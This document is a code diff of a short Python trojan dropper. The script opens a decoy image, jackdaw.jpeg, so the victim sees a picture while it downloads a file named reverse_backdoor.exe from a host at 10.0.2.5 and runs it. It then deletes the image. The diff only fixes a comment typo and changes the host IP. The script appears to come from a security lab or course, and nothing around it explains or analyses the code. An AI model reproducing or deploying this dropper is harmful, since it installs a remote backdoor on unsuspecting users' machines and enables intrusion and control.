@@ -1,5 +1,5 @@
 #! /usr/bin/env python
-# Compatiblity: Python X TODO: add compatibility status everywhere.
+# Compatibility: Python X TODO: add compatibility status everywhere.
 # Might need renaming in the future.
 
 import requests
@@ -18,10 +18,10 @@ def download(url):
 os.chdir(tempfile.gettempdir())
 # The code below requires the obligatory download of a picture before executing the script.
 # TODO: store jackdaw.jpeg in a variable
-download("http://10.0.2.15/downloads/jackdaw.jpeg")
+download("http://10.0.2.5/downloads/jackdaw.jpeg")
 subprocess.Popen("jackdaw.jpeg", shell=True)
 # Yeah, you gotta have the file below too.
-download("http://10.0.2.15/downloads/reverse_backdoor.exe")
+download("http://10.0.2.5/downloads/reverse_backdoor.exe")
 subprocess.call("reverse_backdoor.exe", shell=True)
 
 os.remove("jackdaw.jpeg")
